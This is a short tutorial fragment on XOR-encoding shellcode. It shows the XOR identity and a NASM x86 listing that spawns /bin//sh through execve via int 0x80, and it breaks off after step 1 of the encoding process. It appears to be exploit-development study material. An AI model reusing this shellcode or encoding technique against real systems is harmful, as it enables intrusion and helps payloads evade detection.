# XOR Encoder

## Basic XOR Encoding/Decoding
```ASM
(A XOR B) XOR B = A
```

## XOR Encoding Process
#### 1) Create .nasm file
```ASM
global _start

section .text

_start:

	xor eax, eax			; Preparing Nulls in EAX register
	push eax			; Pushing the first Null DWORD
	
	push 0x68732f6e
	push 0x69622f2f
	
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	
	; syscall()
	mov al, 0xb
	int 0x80
```
